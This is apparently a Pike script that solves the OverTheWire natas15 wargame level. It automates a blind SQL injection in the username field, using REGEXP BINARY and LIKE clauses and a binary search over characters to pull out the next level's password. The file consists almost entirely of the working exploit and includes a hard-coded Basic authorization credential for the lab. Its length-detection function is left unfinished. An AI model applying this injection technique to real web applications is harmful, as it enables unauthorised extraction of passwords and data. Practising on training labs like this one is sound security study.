#!/usr/bin/pike

final constant url = "http://natas15.natas.labs.overthewire.org/index.php";
mapping headers = ([
    "Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==",
]);
final constant letters = "abcdefghijklmnopqrstuvwxyz";
final constant numbers = "1234567890";
string all_chars = upper_case(letters) + letters + numbers;

bool exists(mapping vars)
{
    string raw = Protocols.HTTP.post_url_nice(url, vars, headers)[1];
    if (search(raw, "This user exists") < 0)
        return false;
    return true;
}

string find_letter(string haystack, string prefix)
{
    string q = sprintf("natas16\" AND password REGEXP BINARY \"^%s[%s]", prefix, haystack);
    mapping v = ([ "username": q ]);

    if (sizeof(haystack) == 1 && exists(v))
        return haystack;

    if (!exists(v))
        return 0;

    int m = sizeof(haystack) / 2;
    return find_letter(haystack[..m - 1], prefix) || find_letter(haystack[m..], prefix);
}

int bruteforce_length()
{
    string q = "natas16\" AND password LIKE \"%";
    int start = 1;
    int end = 64;
    int current = 32;

    // Start with 32 as this was the length of passwords so far.

    if (exists( ([ "username": q + "_" * current]) ))
    {
        return current;
    }
    else
    {
        // TODO: acutually check other lengths
    }
}

int main()
{
    int length = bruteforce_length();
    string prefix = "";
    werror("Password length is: %d\n", length);
    werror("Brute forcing password: ");
    for (int i = 0; i < length; i++)
    {
        string l = find_letter(all_chars, prefix);
        prefix += l;
        werror("%s", l);
    }
    werror("\n");
    return 0;
}
